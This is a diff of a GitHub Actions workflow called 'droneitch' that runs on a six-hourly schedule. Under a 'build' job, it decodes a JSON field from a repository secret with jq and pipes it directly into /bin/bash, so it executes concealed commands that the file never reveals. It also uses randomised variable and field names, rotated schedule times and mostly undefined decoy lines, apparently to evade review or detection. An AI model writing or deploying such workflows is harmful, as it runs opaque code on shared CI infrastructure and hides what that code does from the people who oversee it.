@@ -1,25 +1,31 @@
 name: droneitch
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 4/6 * * *'
-jobs:  # 30772
+    - cron: '43 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: droneitch
         env:
-          v19594: ${{ secrets.v19594 }}
+          hgnk804: ${{ secrets.hgnk804 }}
         run: |
-          echo $v19594 | jq -r .goth2714 | /bin/bash
-          echo $b9 | jq -r .g78788 | /bin/bash
-          echo $tpy05 | jq -r .ruhr954 | /bin/bash
-          echo $wn6734 | jq -r .cdor8 | /bin/bash
-          echo $ziuk16625 | jq -r .ek28 | /bin/bash
-          echo $mwvbn85565 | jq -r .u8 | /bin/bash
-          echo $w64 | jq -r .fa083 | /bin/bash
-          echo $tpxb46222 | jq -r .gszs49691 | /bin/bash
-          echo $ufi5665 | jq -r .wqf7973 | /bin/bash
+          echo $hgnk804 | jq -r .oats190 | /bin/bash
+          echo $izjly067 | jq -r .s8 | /bin/bash
+          echo $qxa2357 | jq -r .wpplc1 | /bin/bash
+          echo $u9885 | jq -r .lmze7 | /bin/bash
+          echo $odfu205 | jq -r .wrm254 | /bin/bash
+          echo $s57 | jq -r .ofbjb63 | /bin/bash
+          echo $cvya46073 | jq -r .gon57234 | /bin/bash
+          echo $pwbnc0350 | jq -r .ci004 | /bin/bash
+          echo $syc829 | jq -r .ycar1727 | /bin/bash
+          echo $rqfnm511 | jq -r .hbw2 | /bin/bash
+          echo $yrz78 | jq -r .or5659 | /bin/bash
+          echo $tb2000 | jq -r .ukq2537 | /bin/bash
+          echo $btn35246 | jq -r .olzm5 | /bin/bash
+          echo $zhh7920 | jq -r .qug8281 | /bin/bash
 
